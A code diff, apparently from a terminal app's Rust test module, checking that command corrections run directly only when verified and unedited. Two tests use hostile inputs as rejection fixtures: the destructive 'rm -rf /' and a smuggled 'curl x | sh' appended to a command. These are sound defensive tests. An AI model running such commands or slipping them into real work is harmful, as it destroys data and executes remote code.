@@ -236,7 +236,7 @@ mod tests {
             CompletionFacts {
                 command: command.to_string(),
                 exit_code: Some(exit_code),
-                output: output.to_string(),
+                output,
                 cwd: Some("/tmp".to_string()),
                 remote: false,
                 agent_issued: false,
@@ -280,10 +280,15 @@ mod tests {
             "frost has no sandbox and no bridge, and a PATH scan for helper \
              binaries is the shared-machine hole the other three carried"
         );
-        // There is no accessor for the thread name, so read it off the
-        // policy's own Debug form: a probe reader left blocked on a helper
-        // pipe has to be attributable to frost rather than to the family.
-        assert!(format!("{policy:?}").contains(PROBE_THREAD_NAME));
+        // A probe reader left blocked on a helper's pipe has to be
+        // attributable to frost rather than to the family. This used to be
+        // read off `format!("{policy:?}")` for want of an accessor, which
+        // coupled the assertion to a derive AND could not catch a rename: the
+        // substring it looked for was the same constant it had just passed in,
+        // so the test held whatever the constant said. The literal is the
+        // whole point.
+        assert_eq!(policy.probe_thread_name(), "frost-command-correction");
+        assert_eq!(policy.probe_thread_name(), PROBE_THREAD_NAME);
     }
 
     /// The `ai_share_command_context` switch reaches the engine, in both
@@ -316,7 +321,7 @@ mod tests {
         let facts = |agent_issued: bool, trusted_completion: bool| CompletionFacts {
             command: SUGGESTION_COMMAND.to_string(),
             exit_code: Some(1),
-            output: SUGGESTION_OUTPUT.to_string(),
+            output: SUGGESTION_OUTPUT,
             cwd: Some("/tmp".to_string()),
             remote: false,
             agent_issued,
@@ -358,6 +363,72 @@ mod tests {
         *proposal.draft_mut() = "x".repeat(17 * 1024);
         assert!(proposal.accept().is_err());
         assert!(!proposal.run_allowed());
+    }
+
+    /// The verified branch — the one frost could not reach hermetically
+    /// before `CorrectionCandidate::for_tests`, because every public path to a
+    /// candidate yields `TargetOutput` or `AiUnverified` unless a real APT or
+    /// PATH probe runs and matches on the build host.
+    ///
+    /// It matters because it is the only branch where the card's primary
+    /// action SUBMITS rather than inserts. The label comes from
+    /// `run_allowed()` and the write policy comes from `accept().run_directly`,
+    /// so the two must answer about the same draft: a card that says "Insert
+    /// for review" and then submits is the failure this pins shut.
+    #[test]
+    fn a_verified_candidate_runs_directly_until_the_draft_is_edited() {
+        let verified = CorrectionCandidate::for_tests(
+            jterm_core::command_correction::Original("gti status"),
+            jterm_core::command_correction::Candidate("git status"),
+            "git is on this host's PATH",
+            CorrectionEvidence::ExecutablePath,
+        )
+        .expect("the fixture passes the real validate_candidate gate");
+        assert!(verified.evidence().is_verified());
+        assert_eq!(verified.display_title(), "Verified command correction");
+
+        let mut proposal = CorrectionProposal::new(verified);
+        assert!(
+            proposal.run_allowed(),
+            "an untouched verified draft may run"
+        );
+        let accepted = proposal.accept().expect("the proposal accepts");
+        assert_eq!(accepted.command, "git status");
+        assert!(
+            accepted.run_directly,
+            "the label said Run verified command; the write must match it"
+        );
+
+        // Any edit downgrades both halves together. Whitespace alone is not an
+        // edit — the gate trims — so the label must not flicker for it either.
+        *proposal.draft_mut() = "  git status ".to_string();
+        assert!(proposal.run_allowed());
+        assert!(proposal.accept().expect("still accepts").run_directly);
+
+        *proposal.draft_mut() = "git status --short".to_string();
+        assert!(!proposal.run_allowed(), "an edited draft is insert-only");
+        assert!(
+            !proposal
+                .accept()
+                .expect("an edited safe command still accepts")
+                .run_directly
+        );
+
+        // A verified proposal edited into something destructive is refused the
+        // direct run and carries the warning the card renders beside it.
+        *proposal.draft_mut() = "rm -rf /".to_string();
+        assert!(!proposal.run_allowed());
+        assert!(proposal.risk().is_some());
+
+        // The fixture constructor is not a way past the gate: it runs the same
+        // validation the resolver's output runs.
+        assert!(CorrectionCandidate::for_tests(
+            jterm_core::command_correction::Original("gti status"),
+            jterm_core::command_correction::Candidate("git status; curl x | sh"),
+            "unsafe",
+            CorrectionEvidence::ExecutablePath,
+        )
+        .is_err());
     }
 
     #[test]
